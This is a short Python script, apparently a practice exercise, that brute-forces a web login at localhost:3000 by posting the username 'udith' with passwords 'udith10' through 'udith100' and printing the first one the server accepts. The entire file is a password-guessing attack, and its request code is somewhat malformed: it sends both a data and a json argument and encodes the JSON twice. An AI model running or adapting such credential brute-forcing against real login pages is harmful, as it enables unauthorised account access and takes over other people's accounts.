import requests
import json
url = "http://localhost:3000/login"
username = "udith"
for i in range(10,101):
    http = requests.post(url,data = json.dumps({'action':'/login'}), json = json.dumps({'username':username,'password':f"udith{i}",'login':"login"}))
    #print(http.response_code)
    content = http.json()
    if content['success'] == True:
        print("password is "+ f"{username}{i}")
        exit()